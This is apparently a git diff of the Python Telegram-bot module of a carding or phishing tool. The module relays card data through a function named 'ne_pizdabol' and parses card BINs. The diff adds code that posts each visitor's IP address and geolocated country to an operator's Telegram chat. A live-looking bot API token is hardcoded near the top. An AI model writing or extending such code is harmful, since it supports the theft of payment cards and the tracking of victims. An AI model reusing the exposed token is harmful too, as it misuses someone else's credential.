@@ -1,6 +1,6 @@
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Bot
 from parserBIN import Bin
-import re
+import requests
 API_TOKEN = '7183115873:AAGsfeV2XA-QeeURJsWu1IyylJ1a5yCOJkM'
 from telegram.error import TelegramError
 def escape_reserved_characters(text):
@@ -64,11 +64,33 @@ def ne_pizdabol(card, chat_id='-4150791967'):
     except TelegramError as e:
         print(f"Failed to send message: {e}")
 
-def cheltut():
+def cheltut(ip):
     try:
         chat_id='-4236427099'
         bot = Bot(token=API_TOKEN)
-        message = f'Чел зашел'
-        bot.send_message(chat_id=chat_id, text=message)
+        message = escape_reserved_characters(f'Чувак зашел\n👮🏿‍♂️: {ip} \n🌏: `{get_country_by_ip(ip)}`')
+        bot.send_message(chat_id=chat_id, text=message, parse_mode='MarkdownV2')
     except TelegramError as e:
         print(f"Failed to send message: {e}")
+
+def get_country_by_ip(ip_address):
+    # URL для доступа к ipapi
+    url = f'http://ipapi.co/{ip_address}/json/'
+
+    try:
+        # Отправка запроса к API
+        response = requests.get(url)
+        response.raise_for_status()  # Проверка на наличие ошибок в запросе
+
+        # Преобразование ответа в формат JSON
+        data = response.json()
+
+        # Извлечение информации о стране
+        country = data.get('country_name', 'Unknown')
+
+        return country
+
+    except requests.exceptions.RequestException as e:
+        # Обработка ошибок, связанных с запросом
+        print(f"Error: {e}")
+        return None
